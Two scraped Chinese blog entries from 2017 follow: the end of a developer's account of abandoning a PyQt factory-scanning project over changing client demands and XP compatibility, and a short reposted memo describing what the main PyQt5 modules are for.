	你以为这样就结束了？这还没完，软件在授权给其他公司使用的时候需要授权费，Z的厂需要收取对应的费用才能给其他厂使用，所以也需要注册机制！！
</p>
<p>
	EXO ME？当初可没这个需求啊，不是说自己工厂用的吗？咋突然改成要卖给其他厂了？
</p>
<p>
	我在现场提出了注册机制需要联网，不然很容易被破解，然而，Z的领导说工厂流水线上的电脑根本就没有网络，系统有的还是xp系统....我的天呐，我当初还设计了数据库集中统一管理的方案，这特么告诉我没网络........Z的领导提出了一个神奇的方案，就是搞一个假的注册码，反正写死在软件里面，一个注册码授权20台机器....这是哪门子授权啊，反正我是一脸蒙比。
</p>
<p>
	还有扫描结果每天要自动生成文件自动导出到电脑的D盘等等附加的需求....
</p>
<p>
	结束了演示，回到家各种纠结，然后想办法导出了exe可执行文件，结果各种幺蛾子，要么缺文件，要么不能在64位上执行，更可气的是，这玩意根本不支持xp系统啊，，，，so？？？
</p>
<p>
	做到这我已经没有继续做下去的欲望了，不支持xp等于白搭，还是微软自己家的C#靠谱啊，算了，放弃这个项目了，
</p>
<p>
	跟甲方解释了一番，表示环境各种配，没有网络太复杂了，程序兼容性不好解决等等问题，balabala一大堆，瞬间轻松了....
</p>
<h2>
	最后
</h2>
<p>
	虽然我加班熬夜了好多个通宵，最终没有完成这个项目，但是好歹也是做成了Linux下面能用的软件，如果下次让我去帮工厂做软件，我一定让他们把那些破机器全部换成树莓派，又省钱又好做软件，还不占地方。
</p>
<p>
	最近听说Z自己使用java在开发这个软件，衷心的希望他能坚持做完这个神奇的软件...
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23455 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2017-10-18, 11:43 AM. 
发表在：
								
 ,Python,
								
,  ,经验分享,
",PyQt项目从入手到放弃
"<div class=""post-body"">
<h3>
	PyQt5的类被划分在几个模块中，下面列出了这些模块：
</h3>
<p>
	QtCore 模块包含了非GUI的功能设计。这个模块被用来实现时间，文件和目录，不同数据类型，流，URL，mime类型，线程和进程。<br>
QtGui 模块包含的类用于窗口化的系统结构，事件处理，2D绘图，基本图形，字体和文本。<br>
QtWidgets 模块包含的类提供了一套UI元素来创建经典桌面风格用户界面。<br>
QtMultimedia 模块包含的类用于处理多媒体内容和链接摄像头和无线电功能的API。<br>
QtBluetooth 模块包含的类用于扫描蓝牙设备，并且和他们建立连接互动。<br>
QtNetwork 模块包含的类用于网络编程，这些类使TCP/IP和UDP客户端/服务端编程更加容易和轻便。<br>
QtPositioning 模块包含的类用于多种可获得资源的位置限定，包含卫星定位，Wi-Fi，或一个文本文件。<br>
Enginio 模块用于解决客户端访问Qt云服务托管。 <br>
QtWebSockets 模块包含的类用于解决WebSocket通信协议。 <br>
QtWebKit 包含的关于浏览器的类用于解决基于WebKit2的支持库。 <br>
QtWebKitWidgets 模块包含的关于WebKit1的类基本解决浏览器使用基于QtWidgets应用问题。 <br>
QtXml 模块包含的类用于解析XML文件。这个模块提供SAX和DOM API解决方法。 <br>
QtSvg 模块提供类用于显示SVG文件内容。Scalable Vector Graphics (SVG) 是一种语言，用XML来描述二维图形和图形应用程序。 <br>
QtSql模块提供类驱动数据库工作。 <br>
QtTest 模块包含了方法提供PyQt5应用的单元测试。
</p>
<p>
	--------------------------------------------------------------------------------------------
</p>
<p>
	用作备忘，转载自 http://www.cnblogs.com/archisama/p/5442071.html
</p><div class=""useWarning"" style=""background-color: #f0f0f0"">
本文链接：https://www.92ez.com/?action=show&amp;id=23454 <br>
                        <b>!!! 转载请先联系non3gov@gmail.com授权并在显著位置注明作者和原文链接 !!! <a href=""https://www.92ez.com/black.html"" target=""_blank"" style=""color: #000;text-decoration: underline;background: none"">小黑屋</a> </b><br>
提示：技术文章有一定的时效性，请先确认是否适用你当前的系统环境。
</div>

<style type=""text/css"">
.useWarning a{color:#fff;background-color:#ea6f5a;border-radius:3px;padding:5px 10px;text-decoration: none;}
.tuijian{margin-top:10px;}
.tuijian a{display:block;}
.tuijian img{padding:0;margin:0;}
.tuijian a img{display:block;width:100%;}
.donateme{font-size: 14px;display:none;}
.donateme a{color: green;font-weight: bold;}
.useWarning{padding: 5px 10px;border: #c00 1px dashed;margin: 10px 0 0;color: #c00;}
</style>
</div>","KBdancer, 发表于 2017-09-12, 3:48 PM. 
发表在：
								
 ,Python,
								
,  ,经验分享,
",PyQt5 几个关键模块的用途【备忘】
